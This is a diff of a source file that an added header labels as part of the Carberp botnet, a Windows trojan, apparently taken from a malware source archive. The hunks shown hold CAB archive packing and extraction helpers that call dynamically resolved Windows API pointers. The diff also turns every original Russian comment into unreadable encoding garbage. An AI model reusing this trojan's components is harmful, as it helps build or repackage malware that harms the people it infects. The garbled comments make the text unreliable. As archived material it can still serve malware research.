@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include "CabPacker.h"
 #include "Strings.h"
@@ -485,18 +496,18 @@ bool AddDirToCab( HCAB handle, const char *szDirName, const char *szInternalName
 
 bool AddBlobToCab(HCAB Handle, LPVOID Data, DWORD DataSize, PCHAR InternalName)
 {
-	// Функция добавляет данные из памяти в каб архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Handle == NULL || Data == NULL) return false;
 
-	// Записываем данные во временный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PCHAR FileName = File::GetTempNameA();
 
 	File::WriteBufferA(FileName, Data, DataSize);
 
-	// Добавляем файл в архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool Result = AddFileToCab(Handle, FileName, InternalName);
 
-    // Удаляем временный файл
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     pDeleteFileA(FileName);
 
 	STR::Free(FileName);
@@ -530,7 +541,7 @@ static INT_PTR DIAMONDAPI ExtractCabNotify( FDINOTIFICATIONTYPE fdint, PFDINOTIF
 			{
 				const char* nf = pfdin->psz1;
 				int i = 0;
-				if( ei->renames ) //ищем нужно ли файл переименовывать
+				if( ei->renames ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					while( ei->renames[i] )
 					{
 						if( StrSame( (char*)nf, (char*)ei->renames[i], false ) )
@@ -540,13 +551,13 @@ static INT_PTR DIAMONDAPI ExtractCabNotify( FDINOTIFICATIONTYPE fdint, PFDINOTIF
 						}
 						i += 2;
 					}
-				if( nf == 0 ) //файл не нужно распаковывать
+				if( nf == 0 ) //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					ret = 0;
 				else
 				{
 					pPathCombineA( nameFile, ei->path, nf );
 					plstrcpyA( folder, nameFile );
-					//создаем папку, если таковой нет
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 					pPathRemoveFileSpecA(folder);
 					pSHCreateDirectoryExA( 0, folder, 0 );
 					ret = FN_FDIOPEN( nameFile, _O_CREAT | _O_WRONLY, 0 );
@@ -593,7 +604,7 @@ bool ExtractCab( const char* nameCab, const char* path, const char** renames )
 		m_lstrcpy( pathCab, nameCab );
 		pPathRemoveFileSpecA(pathCab);
 		char* nameFile = (char*)pPathFindFileNameA(nameCab);
-		//в pathCab обязательно должен стоять '\'
+		//пїЅ pathCab пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ '\'
 		int l = m_lstrlen(pathCab);
 		pathCab[l] = '\\';
 		pathCab[l+1] = 0;
